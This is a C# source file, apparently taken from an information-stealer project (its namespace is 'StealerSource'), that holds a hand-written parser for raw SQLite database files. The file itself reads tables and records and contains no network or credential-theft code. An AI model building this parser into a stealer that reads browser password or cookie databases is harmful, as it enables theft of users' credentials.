using System;
using System.IO;
using System.Text;

namespace StealerSource
{
    class SQHandler
    {
        private struct RecordHeaderField
        {
            public Int64 size;
            public Int64 type;
        }
        private struct TableEntry
        {
            public Int64 row_id;
            public string[] content;
        }
        private struct SqliteMasterEntry
        {
            public Int64 row_id;
            public string item_type;
            public string item_name;
            public Int64 root_num;
            public string sql_statement;
        }

        private byte[] FileBytes;
        private string[] FieldNames;
        private ulong PageSize = 0;
        private ulong DbEncoding = 0;
        private TableEntry[] TableEntries;
        private SqliteMasterEntry[] MasterTableEntries;
        private byte[] SQLDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

        public SQHandler(string FileName)
        {
            FileBytes = File.ReadAllBytes(FileName);
            PageSize = ConvertToULong(16, 2);
            DbEncoding = ConvertToULong(56, 4);
            ReadMasterTable(100);
        }
        public string GetValue(int row_num, int field)
        {
            try
            {
                if (row_num >= TableEntries.Length)
                    return null;
                if (field >= TableEntries[row_num].content.Length)
                    return null;
                return TableEntries[row_num].content[field];
            }
            catch
            {
                return null;
            }
        }
        public int GetRowCount()
        {
            return TableEntries.Length;
        }
        public string GetValue(int row_num, string field)
        {
            try
            {
                int found = -1;
                for (int i = 0; i <= FieldNames.Length; i += 1)
                {
                    if (FieldNames[i].ToLower().CompareTo(field.ToLower()) == 0)
                    {
                        found = i;
                        break;
                    }
                }
                if (found == -1)
                    return null;

                return GetValue(row_num, found);
            }
            catch
            {
                return null;
            }
        }

        private bool ReadTableFromOffset(UInt64 Offset)
        {
            try
            {
                if (FileBytes[Offset] == 0xd)
                {
                    UInt16 Length = (ushort)(ConvertToULong((int)Offset + 3, 2) - 1);
                    int ol = 0;

                    if ((TableEntries != null))
                    {
                        ol = TableEntries.Length;
                        Array.Resize(ref TableEntries, TableEntries.Length + Length + 1);
                    }
                    else
                    {
                        TableEntries = new TableEntry[Length + 1];
                    }
                    UInt64 EntOffset = default(UInt64);
                    for (ushort i = 0; i <= Length; i += 1)
                    {
                        EntOffset = ConvertToULong((int)Offset + 8 + (i * 2), 2);
                        if (Offset != 100) EntOffset = EntOffset + Offset;
                        int t = GVL((int)EntOffset);
                        Int64 size = CVL((int)EntOffset, t);
                        int s = GVL((int)(EntOffset + ((ulong)t - EntOffset) + 1));
                        TableEntries[ol + i].row_id = CVL((int)(EntOffset + ((ulong)t - EntOffset) + 1), s);
                        EntOffset += ((ulong)s - EntOffset) + 1;
                        t = GVL((int)EntOffset);
                        s = t;
                        Int64 Rec_Header_Size = CVL((int)EntOffset, t);
                        RecordHeaderField[] FieldSize = null;
                        Int64 size_read = (long)((EntOffset - (ulong)t) + (ulong)1);
                        int j = 0;
                        while (size_read < Rec_Header_Size)
                        {
                            Array.Resize(ref FieldSize, j + 1);
                            t = s + 1;
                            s = GVL(t);
                            FieldSize[j].type = CVL(t, s);
                            if (FieldSize[j].type > 9)
                            {
                                if (IsOdd(FieldSize[j].type)) FieldSize[j].size = (FieldSize[j].type - 13) / 2;
                                else FieldSize[j].size = (FieldSize[j].type - 12) / 2;
                            }
                            else
                            {
                                FieldSize[j].size = SQLDataTypeSize[FieldSize[j].type];
                            }
                            size_read = size_read + (s - t) + 1;
                            j = j + 1;
                        }
                        TableEntries[ol + i].content = new string[FieldSize.Length];
                        int counter = 0;
                        for (int k = 0; k <= FieldSize.Length - 1; k += 1)
                        {
                            if (FieldSize[k].type > 9)
                            {
                                if (!IsOdd(FieldSize[k].type))
                                {
                                    if (DbEncoding == 1)
                                    {
                                        TableEntries[ol + i].content[k] = Encoding.Default.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + counter), (int)FieldSize[k].size);
                                    }
                                    else if (DbEncoding == 2)
                                    {
                                        TableEntries[ol + i].content[k] = Encoding.Unicode.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + counter), (int)FieldSize[k].size);
                                    }
                                    else if (DbEncoding == 3)
                                    {
                                        TableEntries[ol + i].content[k] = Encoding.BigEndianUnicode.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + counter), (int)FieldSize[k].size);
                                    }
                                }
                                else
                                {
                                    TableEntries[ol + i].content[k] = Encoding.Default.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + counter), (int)FieldSize[k].size);
                                }
                            }
                            else
                            {
                                TableEntries[ol + i].content[k] = Convert.ToString(ConvertToULong((int)((long)EntOffset + Rec_Header_Size + counter), (int)FieldSize[k].size));
                            }
                            counter += (int)FieldSize[k].size;
                        }
                    }
                }
                else if (FileBytes[Offset] == 0x5)
                {
                    UInt16 Length = (ushort)(ConvertToULong((int)(Offset + 3), 2) - 1);
                    UInt16 EntOffset = default(UInt16);
                    for (ushort i = 0; i <= Length; i += 1)
                    {
                        EntOffset = (ushort)ConvertToULong((int)((int)Offset + 12 + (i * 2)), 2);
                        ReadTableFromOffset((ConvertToULong((int)(Offset + (ulong)EntOffset), 4) - 1) * PageSize);
                    }
                    ReadTableFromOffset((ConvertToULong((int)(Offset + 8), 4) - 1) * PageSize);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
        private void ReadMasterTable(long Offset)
        {
            try
            {
                if (FileBytes[Offset] == 0xd)
                {
                    ulong Length = ConvertToULong((int)Offset + 3, 2) - 1;
                    int ol = 0;
                    if ((MasterTableEntries != null))
                    {
                        ol = MasterTableEntries.Length;
                        Array.Resize(ref MasterTableEntries, MasterTableEntries.Length + (int)Length + 1);
                    }
                    else
                    {
                        MasterTableEntries = new SqliteMasterEntry[Length + 1];
                    }
                    UInt64 EntOffset = default(UInt64);
                    for (ulong i = 0; i <= Length; i += 1)
                    {
                        EntOffset = ConvertToULong((int)Offset + 8 + ((int)i * 2), 2);
                        if (Offset != 100)
                            EntOffset += (ulong)Offset;
                        dynamic t = GVL((int)EntOffset);
                        Int64 size = CVL((int)EntOffset, t);
                        dynamic s = GVL((int)(EntOffset + ((ulong)t - EntOffset) + 1));
                        MasterTableEntries[ol + (int)i].row_id = CVL((int)(EntOffset + ((ulong)t - EntOffset) + 1), s);
                        EntOffset += ((ulong)s - EntOffset) + 1;
                        t = GVL((int)EntOffset);
                        s = t;
                        Int64 Rec_Header_Size = CVL((int)EntOffset, t);
                        Int64[] Field_Size = new Int64[5];
                        for (int j = 0; j <= 4; j += 1)
                        {
                            t = s + 1;
                            s = GVL(t);
                            Field_Size[j] = CVL(t, s);
                            if (Field_Size[j] > 9)
                            {
                                if (IsOdd(Field_Size[j]))
                                {
                                    Field_Size[j] = (Field_Size[j] - 13) / 2;
                                }
                                else
                                {
                                    Field_Size[j] = (Field_Size[j] - 12) / 2;
                                }
                            }
                            else
                            {
                                Field_Size[j] = SQLDataTypeSize[Field_Size[j]];
                            }
                        }
                        if (DbEncoding == 1)
                        {
                            MasterTableEntries[ol + (int)i].item_type = Encoding.Default.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size), (int)Field_Size[0]);
                        }
                        else if (DbEncoding == 2)
                        {
                            MasterTableEntries[ol + (int)i].item_type = Encoding.Unicode.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size), (int)Field_Size[0]);
                        }
                        else if (DbEncoding == 3)
                        {
                            MasterTableEntries[ol + (int)i].item_type = Encoding.BigEndianUnicode.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size), (int)Field_Size[0]);
                        }
                        if (DbEncoding == 1)
                        {
                            MasterTableEntries[ol + (int)i].item_name = Encoding.Default.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + Field_Size[0]), (int)Field_Size[1]);
                        }
                        else if (DbEncoding == 2)
                        {
                            MasterTableEntries[ol + (int)i].item_name = Encoding.Unicode.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + Field_Size[0]), (int)Field_Size[1]);
                        }
                        else if (DbEncoding == 3)
                        {
                            MasterTableEntries[ol + (int)i].item_name = Encoding.BigEndianUnicode.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + Field_Size[0]), (int)Field_Size[1]);
                        }
                        MasterTableEntries[ol + (int)i].root_num = (long)ConvertToULong((int)((long)EntOffset + Rec_Header_Size + Field_Size[0] + Field_Size[1] + Field_Size[2]), (int)Field_Size[3]);
                        if (DbEncoding == 1)
                        {
                            MasterTableEntries[ol + (int)i].sql_statement = Encoding.Default.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + Field_Size[0] + Field_Size[1] + Field_Size[2] + Field_Size[3]), (int)Field_Size[4]);
                        }
                        else if (DbEncoding == 2)
                        {
                            MasterTableEntries[ol + (int)i].sql_statement = Encoding.Unicode.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + Field_Size[0] + Field_Size[1] + Field_Size[2] + Field_Size[3]), (int)Field_Size[4]);
                        }
                        else if (DbEncoding == 3)
                        {
                            MasterTableEntries[ol + (int)i].sql_statement = Encoding.BigEndianUnicode.GetString(FileBytes, (int)((long)EntOffset + Rec_Header_Size + Field_Size[0] + Field_Size[1] + Field_Size[2] + Field_Size[3]), (int)Field_Size[4]);
                        }
                    }
                }
                else if (FileBytes[Offset] == 0x5)
                {
                    ushort Length = (ushort)(ConvertToULong((int)Offset + 3, 2) - 1);
                    ushort EntOffset = default(UInt16);
                    for (int i = 0; i <= Length; i += 1)
                    {
                        EntOffset = (ushort)ConvertToULong((int)Offset + 12 + (i * 2), 2);
                        if (Offset == 100)
                        {
                            ReadMasterTable((long)((ConvertToULong((int)EntOffset, 4) - 1) * PageSize));
                        }
                        else
                        {
                            ReadMasterTable((long)((ConvertToULong((int)(Offset + (long)EntOffset), 4) - 1) * PageSize));
                        }
                    }
                    ReadMasterTable((long)((ConvertToULong((int)((int)Offset + 8), 4) - 1) * PageSize));
                }
            }
            catch
            {
            }
        }
        public bool ReadTable(string TableName)
        {
            try
            {
                int found = -1;
                for (int i = 0; i <= MasterTableEntries.Length; i += 1)
                {
                    if (MasterTableEntries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                    {
                        found = i;
                        break;
                    }
                }
                if (found == -1) return false;
                var fields = MasterTableEntries[found].sql_statement.Substring(MasterTableEntries[found].sql_statement.IndexOf("(") + 1).Split(',');
                for (int i = 0; i <= fields.Length - 1; i += 1)
                {
                    fields[i] = fields[i].TrimStart();
                    var index = fields[i].IndexOf(' ');
                    if (index > 0) fields[i] = fields[i].Substring(0, index);
                    if (fields[i].IndexOf("UNIQUE") != 0)
                    {
                        Array.Resize(ref FieldNames, i + 1);
                        FieldNames[i] = fields[i];
                    }
                }
                return ReadTableFromOffset(((ulong)(MasterTableEntries[found].root_num - 1) * PageSize));
            }
            catch
            {
                return false;
            }
        }
        public string[] GetTableNames()
        {
            try
            {
                string[] retVal = new string[1];
                int arr = 0;
                for (int i = 0; i <= MasterTableEntries.Length - 1; i += 1)
                {
                    if (MasterTableEntries[i].item_type == "table")
                    {
                        Array.Resize(ref retVal, arr + 1);
                        retVal[arr] = MasterTableEntries[i].item_name;
                        arr = arr + 1;
                    }
                }
                return retVal;
            }
            catch
            {
                return null;
            }
        }
        private ulong ConvertToULong(int StartIndex, int Size)
        {
            try
            {
                if (Size > 8 | Size == 0) return 0;
                UInt64 retVal = 0;
                for (int i = 0; i <= Size - 1; i += 1)
                    retVal = ((retVal << 8) | FileBytes[StartIndex + i]);
                return retVal;
            }
            catch
            {
                return 0;
            }
        }
        private int GVL(int StartIdx)
        {
            try
            {
                if (StartIdx > FileBytes.Length)
                    return 0;
                for (int i = StartIdx; i <= StartIdx + 8; i += 1)
                {
                    if (i > FileBytes.Length - 1)
                    {
                        return 0;
                    }
                    else if ((FileBytes[i] & 0x80) != 0x80)
                    {
                        return i;
                    }
                }
                return StartIdx + 8;
            }
            catch
            {
                return 0;
            }
        }
        private Int64 CVL(int StartIdx, int EndIdx)
        {
            try
            {
                EndIdx = EndIdx + 1;
                byte[] retus = new byte[8];
                dynamic Length = EndIdx - StartIdx;
                bool Bit64 = false;
                if (Length == 0 | Length > 9) return 0;
                if (Length == 1)
                {
                    retus[0] = (byte)(FileBytes[StartIdx] & 0x7f);
                    return BitConverter.ToInt64(retus, 0);
                }
                if (Length == 9) Bit64 = true;
                int j = 1;
                int k = 7;
                int y = 0;
                if (Bit64)
                {
                    retus[0] = FileBytes[EndIdx - 1];
                    EndIdx--;
                    y = 1;
                }
                for (int i = (EndIdx - 1); i >= StartIdx; i += -1)
                {
                    if ((i - 1) >= StartIdx)
                    {
                        retus[y] = (byte)((int)(FileBytes[i] >> (j - 1)) & ((int)(0xff >> j)) | ((int)FileBytes[i - 1] << k));
                        j = j + 1;
                        y = y + 1;
                        k = k - 1;
                    }
                    else
                    {
                        if (!Bit64) retus[y] = (byte)((FileBytes[i] >> (j - 1)) & (0xff >> j));
                    }
                }
                return BitConverter.ToInt64(retus, 0);
            }
            catch
            {
                return 0;
            }
        }
        private bool IsOdd(Int64 value)
        {
            return (value & 1) == 1;
        }
    }
}